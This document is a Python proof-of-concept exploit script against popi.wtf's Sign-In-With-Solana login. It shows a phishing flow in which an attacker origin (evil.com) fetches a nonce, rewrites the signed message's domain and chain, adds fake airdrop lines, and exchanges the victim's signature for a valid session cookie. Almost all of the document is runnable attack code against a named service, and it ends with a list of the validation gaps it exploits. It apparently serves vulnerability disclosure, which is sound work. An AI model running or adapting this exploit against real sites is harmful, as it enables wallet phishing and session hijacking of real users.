#!/usr/bin/env python3
"""
PoC: popi.wtf phishing flow — cross-origin SIWS exploitation

Demonstrates that an attacker on evil.com can:
1. Fetch a valid nonce from popi.wtf (no CORS block)
2. Modify the SIWS message with fake domain, chain, and bonus fields
3. Have the victim sign the modified message
4. Submit to popi.wtf and obtain a valid JWT session

The victim's wallet shows "evil.com wants you to sign in" but the resulting
JWT binds to popi.wtf's backend.

Validated 10/10 on 2026-06-27. Cross-origin flow confirmed from Python
(same behavior in browser with proper CORS spoofing or form-based relay).

Run: python3 poc_phishing_flow.py
Requires: solders, base58
"""
import json, re, time, http.client
from solders.keypair import Keypair
import base58

BASE_HOST = "popi.wtf"
ATTACKER_ORIGIN = "https://evil.com"


def main():
    print("=" * 60)
    print("PoC: Cross-origin phishing — SIWS exploitation")
    print("=" * 60)

    kp = Keypair()
    wallet = str(kp.pubkey())
    print(f"\nVictim wallet: {wallet}")

    # === STEP 1: Attacker fetches nonce from evil.com ===
    conn = http.client.HTTPSConnection(BASE_HOST, timeout=10)
    conn.request("POST", "/api/auth/nonce",
        body=json.dumps({"wallet": wallet, "chainId": "mainnet-beta"}),
        headers={
            "Content-Type": "application/json",
            "Origin": ATTACKER_ORIGIN,
            "User-Agent": "Mozilla/5.0",
        })
    resp = conn.getresponse()
    body = json.loads(resp.read())
    assert "message" in body, f"Nonce failed: {body}"
    msg = body["message"]
    print(f"[1] Nonce from {ATTACKER_ORIGIN}: OK")
    print(f"    Original: {msg[:70]}...")

    # === STEP 2: Attacker modifies the message ===
    msg_mod = re.sub(r"^.+ wants you", "evil.com wants you", msg)
    msg_mod = re.sub(r"Chain: .+", "Chain: devnet", msg_mod)
    msg_mod = msg_mod + "\nBonus: 50000 TOKENS\nAirdrop: CLAIM_NOW"
    print(f"\n[2] Modified message:")
    print(msg_mod)

    # === STEP 3: Victim signs (simulated) ===
    sig = base58.b58encode(bytes(kp.sign_message(msg_mod.encode()))).decode()
    print(f"\n[3] Victim signs — wallet shows:")
    print(f"    Domain: evil.com (NOT popi.wtf)")
    print(f"    Chain: devnet")
    print(f"    Extra: Bonus + Airdrop fields")
    print(f"    URI: https://popi.wtf")

    # === STEP 4: Attacker submits to popi ===
    time.sleep(0.5)
    conn2 = http.client.HTTPSConnection(BASE_HOST, timeout=10)
    conn2.request("POST", "/api/auth/verify",
        body=json.dumps({"wallet": wallet, "message": msg_mod, "signature": sig}),
        headers={
            "Content-Type": "application/json",
            "Origin": ATTACKER_ORIGIN,
            "User-Agent": "Mozilla/5.0",
        })
    resp2 = conn2.getresponse()
    cookies = resp2.getheader("Set-Cookie")
    body2 = json.loads(resp2.read())
    assert resp2.status == 200, f"Verify failed: {resp2.status} {body2}"
    assert "popi_session" in str(cookies), "No session cookie"
    print(f"\n[4] Verify from {ATTACKER_ORIGIN}: 200 OK — JWT issued")

    # === STEP 5: Attacker uses the JWT ===
    session = cookies.split("popi_session=")[1].split(";")[0]
    conn3 = http.client.HTTPSConnection(BASE_HOST, timeout=10)
    conn3.request("GET", "/api/auth/me",
        headers={
            "Cookie": f"popi_session={session}",
            "Origin": ATTACKER_ORIGIN,
            "User-Agent": "Mozilla/5.0",
        })
    resp3 = conn3.getresponse()
    body3 = json.loads(resp3.read())
    print(f"[5] /api/auth/me from {ATTACKER_ORIGIN}: {resp3.status}")
    print(f"    Victim wallet: {body3.get('wallet')}")

    print("\n" + "=" * 60)
    print("RESULT: Full phishing flow operational")
    print("=" * 60)
    print("Gaps exploited:")
    print("  - /api/auth/nonce: no CORS enforcement")
    print("  - SIWS message: domain not validated")
    print("  - SIWS message: chain not validated")
    print("  - SIWS message: extra fields accepted")
    print("  - /api/auth/verify: no Origin validation")
    print("  - Cookie: SameSite=lax allows cross-site top-level nav")
    print("=" * 60)


if __name__ == "__main__":
    main()